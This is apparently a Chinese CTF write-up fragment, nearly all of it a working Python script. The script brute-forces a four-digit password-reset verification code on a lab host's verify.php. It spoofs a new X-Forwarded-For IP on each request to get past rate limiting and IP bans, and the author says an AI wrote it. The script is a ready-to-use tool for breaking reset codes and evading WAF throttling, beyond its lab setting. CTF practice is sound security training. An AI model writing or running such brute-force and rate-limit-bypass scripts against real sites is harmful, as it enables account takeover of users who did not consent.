尝试爆破四位数验证码，发现有大量的显示“频繁”导致的失败

发现有一个类似“banIP”的操作，只要换 X-Forwarded-For 好像就能绕过这个waf，让ai帮忙写一个爆破的脚本

```python
import requests
import time
from urllib.parse import urljoin

# 配置
TARGET_HOST = "192.168.32.92"
BASE_URL = f"http://{TARGET_HOST}"
RID = "cdb1c5b1afb9bac6"  # 你的 reset ID
SESSION_ID = "irji9p5c0p6207e0mauauu4fb3"  # 你的 session

def try_CODE(code):
    """尝试单个 CODE 验证码"""
    CODE = f"{code:04d}"
    
    # 构造请求头 - 关键是 X-Forwarded-For 绕过速率限制
    headers = {
        'Host': TARGET_HOST,
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Origin': BASE_URL,
        'Referer': f'{BASE_URL}/verify.php?rid={RID}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': f'PHPSESSID={SESSION_ID}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        # 关键：每次使用不同的伪造 IP
        'X-Forwarded-For': f'10.{(code//65536)%256}.{(code//256)%256}.{code%256}'
    }
    
    # POST 数据
    data = {
        'rid': RID,
        'code': CODE
    }
    
    try:
        # 发送 POST 请求，不自动跟随重定向
        response = requests.post(
            f'{BASE_URL}/verify.php?rid={RID}',
            headers=headers,
            data=data,
            allow_redirects=False,  # 不自动跟随重定向
            timeout=10
        )
        
        # 检查响应
        location = response.headers.get('Location', '')
        
        # 判断成功的条件：
        # 1. 如果重定向到的不是 verify.php，说明验证成功
        # 2. 或者状态码是 200 且没有错误消息
        
        if response.status_code == 302:
            if 'verify.php' not in location:
                # 重定向到其他页面，成功！
                print(f"\n{'='*60}")
                print(f"[SUCCESS] 找到正确的 CODE: {CODE}")
                print(f"状态码: {response.status_code}")
                print(f"重定向到: {location}")
                print(f"{'='*60}")
                return CODE
            # 如果重定向回 verify.php，说明验证失败
        
        elif response.status_code == 200:
            # 如果直接返回 200，检查内容
            if '验证码错误' not in response.text and 'msg err' not in response.text:
                print(f"\n{'='*60}")
                print(f"[SUCCESS] 找到正确的 CODE: {CODE}")
                print(f"状态码: {response.status_code}")
                print(f"响应长度: {len(response.text)}")
                print(f"{'='*60}")
                return CODE
        
        # 每 100 次显示进度
        if code % 100 == 0:
            print(f"[*] 进度: {code:04d}/10000 ({code/100:.1f}%) - 当前测试: {CODE}")
            
    except requests.exceptions.Timeout:
        print(f"[!] 超时: {CODE}")
    except Exception as e:
        print(f"[!] 错误 {CODE}: {e}")
    
    return None

def main():
    print("="*60)
    print("CTF CODE 验证码爆破工具")
    print("="*60)
    print(f"目标: {BASE_URL}")
    print(f"Reset ID: {RID}")
    print(f"Session: {SESSION_ID}")
    print(f"方法: X-Forwarded-For 伪造绕过速率限制")
    print("="*60)
    print()
    
    start_time = time.time()
    
    # 先尝试一些常见的验证码
    print("[*] 首先尝试常见验证码...")
    common_CODEs = [1234, 0000, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 
                   1024, 2048, 4096, 8192, 9527, 6789, 1357, 2468]
    
    for code in common_CODEs:
        result = try_CODE(code)
        if result:
            elapsed = time.time() - start_time
            print(f"\n用时: {elapsed:.2f} 秒")
            print(f"\n下一步操作:")
            print(f"访问: {BASE_URL}/verify.php?rid={RID}")
            print(f"或等待重定向后的页面")
            return
    
    print("\n[*] 常见验证码未命中，开始全量扫描...")
    print()
    
    # 全量扫描
    for code in range(10000):
        # 跳过已经测试过的常见验证码
        if code in common_CODEs:
            continue
            
        result = try_CODE(code)
        if result:
            elapsed = time.time() - start_time
            print(f"\n用时: {elapsed:.2f} 秒")
            print(f"尝试次数: {code + 1}")
            print(f"\n下一步操作:")
            print(f"访问: {BASE_URL}/verify.php?rid={RID}")
            return
    
    print("\n[!] 所有验证码都已尝试，未找到正确答案")
    elapsed = time.time() - start_time
    print(f"总用时: {elapsed:.2f} 秒")

if __name__ == "__main__":
    main()
```
